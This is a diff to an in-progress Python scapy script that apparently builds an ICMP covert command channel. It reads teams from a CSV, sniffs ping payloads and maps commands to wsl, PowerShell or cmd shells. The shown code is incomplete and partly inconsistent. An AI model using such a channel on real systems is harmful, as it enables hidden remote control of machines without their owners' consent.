@@ -1,6 +1,7 @@
 from scapy.all import *
 import csv
 import sys
+import threading
 
 teams = []
 cmdproc = [["l", "wsl"], ["p", "powershell"], ["c", "cmd"]]
@@ -19,6 +20,7 @@ def setup():
             else:
                 teams[int(row[0]) - 1].append([row[1], row[2]])
     print(teams)
+    #shell()
 
 
 def sniffer():
@@ -27,10 +29,12 @@ def sniffer():
 
 
 def resp_mgmt(pkt):
-    if str(pkt.getlayer(ICMP).type) == "8":
-        print(pkt.show())
-        print(pkt.getlayer(ICMP).type)
-        instruct = pkt.getlayer(ICMP).load.decode()
+    if str(pkt.getlayer(ICMP).type) == "echo-request":
+        print("True")
+    print(pkt.show())
+    print(pkt.getlayer(ICMP).type)
+    data = pkt.getlayer(ICMP).load.decode()
+    print(data)
 
 
 def shell():
@@ -67,12 +71,24 @@ def shell():
             print("Invalid command")
 
 
+def heartbeat():#Using this because ping has aknowledgement already
+    print("THIS IS BEAT")
+
+
 def main():
     global verbose
     try:
         if sys.argv[1] == "-v":
             verbose = True
     finally:
+        """
+        t1 = threading.Thread(target=setup)
+        t2 = threading.Thread(target=sniffer)
+        t1.start()
+        t2.start()
+        t1.join()
+        t2.join()
+        """
         setup()
         shell()
 
